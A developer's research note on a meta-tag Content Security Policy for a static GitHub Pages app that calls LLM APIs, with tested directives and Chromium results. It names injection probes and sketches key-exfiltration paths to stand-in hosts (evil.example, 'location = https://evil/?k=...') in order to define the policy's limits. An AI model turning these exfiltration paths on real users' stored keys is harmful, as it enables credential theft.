# Meta-tag CSP for a static GitHub Pages SPA that must call user-chosen LLM hosts

> Research note: the Content Security Policy in `src/csp.ts` and why `connect-src` is as open as it is. Researched 2026-11-08. Confidence: high for Chromium (production build tested in Chrome 156); Firefox and Safari were not run.

Researched and tested 2026-11-08. Test bed: Vite 7.3.7 production build + React 19.3.1 + three 0.187.0 + uPlot 1.6.32 + @anthropic-ai/sdk 1.6.0, served from `http://localhost` and loaded in Chrome 156.0.8078.81 (Windows). Files: scratchpad `csp-test/` (`index.html`, `src/main.js`). Chromium only; Firefox/Safari not run. Tags: H = tested here or in spec; M = secondary.

## 1. Recommended policy (tested as written)

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data: blob:; font-src 'self' data:; media-src 'self' blob: data:; worker-src 'self' blob:; connect-src 'self' blob: data: https: http://localhost:* http://127.0.0.1:*; manifest-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none'">
```

Inject it **in the production build only** (dev server needs inline scripts for HMR / React Refresh). Verified build output (Vite 7.3.7, `base: '/betteraim/'`): the meta lands first in `<head>`, charset meta still within the first 1024 bytes.
```js
// vite.config.ts
const cspMeta = { name: 'csp-meta', apply: 'build',
  transformIndexHtml: () => [{ tag: 'meta', attrs: { 'http-equiv': 'Content-Security-Policy', content: csp }, injectTo: 'head-prepend' }] };
```
(meta placement matters: "policies in meta elements are not applied to content which precedes them", CSP3 3.3.)

### What I tested (Chrome 156, policy above, real `vite build` output)

| Check | Result |
|---|---|
| Vite 7 prod HTML: `<script type=module crossorigin src>` + `modulepreload` + external CSS, no inline script | works under `script-src 'self'`, `style-src 'self'` |
| React 19 `style={{color, width, '--x'}}` | **works** (React sets styles through CSSOM `el.style.x = ...`, which CSP does not block). No `'unsafe-inline'` needed |
| `setAttribute('style', ...)` / `style.cssText` / `style="..."` in markup | **blocked** (as MDN says). Libraries that do this, or inject `<style>` tags (lil-gui, styled-components, emotion, etc.), would break |
| Three.js WebGLRenderer render + readPixels | works; no `unsafe-eval`, no `wasm-unsafe-eval` |
| Three `TextureLoader` with `data:` and `blob:` image URLs | works (`img-src data: blob:`) |
| uPlot chart + `uplot.min.css` import | works (CSS is an external file in the build) |
| `new AudioContext()` oscillator; `new Audio('data:audio/wav...')` | works (`media-src data:`) |
| `fetch('data:...')` and `fetch(blobUrl)` | **blocked unless `data:`/`blob:` are in `connect-src`** (first run failed with "connect-src :: data"). Either keep them in `connect-src` (harmless, local) or use `blob.arrayBuffer()` / `atob` instead of fetch |
| Blob worker; Vite `new Worker(new URL('./w.js', import.meta.url), {type:'module'})` | works with `worker-src 'self' blob:` |
| `eval`, `new Function`, injected inline `<script>`, `<img onerror=...>`, `<script src=https://evil.example>`, third-party `<img>` | all blocked |
| `@anthropic-ai/sdk` with `dangerouslyAllowBrowser: true`, fake key | request reached `api.anthropic.com`, real `401 invalid x-api-key` JSON readable: CSP and CORS both pass |
| `http://localhost:11434`, `http://127.0.0.1:1234` | pass CSP (failed only with connection refused, nothing listening) |
| `http://[::1]:11434` | **blocked even with `http://[::1]:*` in connect-src**: Chromium cannot express IPv6 literals in CSP host sources. Tell users to use `localhost` or `127.0.0.1` |
| `http://localhost.evil.example`, `http://example.com`, `http://192.168.1.5:1234` | blocked, so LAN-IP http model servers are unsupported (they would be mixed content anyway) |
| Dynamically inserted `<meta http-equiv=CSP>` after load | **enforced**, and can only tighten: after adding `connect-src 'self' https://api.anthropic.com`, `https://example.com` was blocked; a second meta listing example.com did not loosen it |

## 2. What a static meta CSP can and cannot do (be honest in the docs)

**Can:** stop injected/inline/`eval`/third-party scripts and event-handler attributes; stop every non-`'self'` image, style, font, media, frame, object and form post (`form-action 'none'`); stop plain `http:` to anything but localhost/127.0.0.1; pin `<base>`.

**Cannot, because `connect-src` must contain `https:`:**
- Any script that does run (a compromised dependency bundled into `assets/*.js`, i.e. supply chain, which `'self'` trusts) can read the key from `localStorage` and send it to **any HTTPS host** via `fetch`, `sendBeacon` (tested: allowed), `WebSocket`, `EventSource`.
- CSP has no control over top-level navigation (`location = 'https://evil/?k=...'`, `window.open`); `navigate-to` was never shipped. Browser extensions with page access are out of scope too.
- A static policy cannot say "only the host the user typed". CSP can only be tightened after load (verified above): a tiny external bootstrap script placed first could read the saved base URL and write a narrower meta (`connect-src 'self' https://api.anthropic.com https://<their-host>`), then a settings change would `location.reload()`. It only helps against non-script injection and an attacker who cannot also rewrite localStorage, so for v1 I would **not** build it (complexity vs. benefit).
- Meta cannot carry **`frame-ancestors`, `report-uri`, `sandbox`** (CSP3 3.3 says they are not supported in meta) nor Report-Only (MDN). So no clickjacking protection and no violation reports on GitHub Pages. Mitigate clickjacking only if it matters (it mostly does not: no one-click destructive action beyond "reset").

**Realistic protection is therefore:** (1) `script-src 'self'` (blocks XSS), (2) no third-party scripts, lockfile, `pnpm audit`/Renovate to limit supply-chain risk, (3) **render all LLM text as text** (React default escaping; never `dangerouslySetInnerHTML`), the main HTML-injection source in this app, (4) the key only ever goes to the provider's URL in code.

**GitHub Pages origin gotcha (general web platform, not tested):** `localStorage` is per origin (scheme + host + port, not path). Every project page under `https://<user>.github.io/` (other repos too) shares BetterAim's origin and can read the stored key, and CSP is per document so it does not help there. `github.io` is on the Public Suffix List so other users are isolated. If this matters, host on a custom domain dedicated to BetterAim, or document the limitation. Optional softening: default to `sessionStorage` with a "remember on this device" checkbox (still same-origin readable).

## 3. Notes on individual directives

- `default-src 'none'` plus explicit allow-lists is what I tested. Favicon works through `img-src 'self'`.
- `style-src 'self'` is enough for React inline styles (see table). If a future dependency injects `<style>`, prefer replacing it over adding `'unsafe-inline'`; `style-src-attr 'unsafe-inline'` is the narrow escape hatch if only attributes are needed.
- `worker-src 'self' blob:` covers Vite workers and blob workers. Draco/KTX2/Basis loaders (not used) would also need `'wasm-unsafe-eval'` (not tested).
- `connect-src` host-source with `:*` matches any port for that exact host; `localhost` and `127.0.0.1` need separate entries. `'self'` is needed for any same-origin fetch.
- Do not add `upgrade-insecure-requests` (not tested; could rewrite `http://localhost` calls).
- `manifest-src 'self'` only matters if a PWA manifest is added.

## 4. Sources

- Own tests (above). Spec: https://w3c.github.io/webappsec-csp/ (3.3: meta does not support `report-uri`, `frame-ancestors`, `sandbox`; "policies in meta elements are not applied to content which precedes them"; "Modifications to the `content` attribute ... after the element has been parsed will be ignored").
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP (meta "does not support all CSP features", Report-Only not allowed in meta), https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/connect-src (governs fetch, XHR, WebSocket, EventSource, sendBeacon, `a[ping]`, fetchLater), https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/style-src (CSSOM property assignment is not blocked; `setAttribute('style')` and `cssText` are).

## 5. Confidence and open doubts

- H for everything in the test table on Chromium 156. Not run: Firefox/Safari (CSP semantics are standard, but IPv6 literals and `blob:` fetch rules can differ), the dev server, a real GitHub Pages deploy, Three loaders beyond TextureLoader, real Ollama/LM Studio.
- The plugin snippet was built (output inspected), not loaded in a browser; HTML-encoded `&#39;` in the attribute is decoded by the parser as usual.
- The exfiltration limits in section 2 follow from `connect-src https:` and standard CSP scope; I did not attempt a real attack beyond the beacon/img probes above.
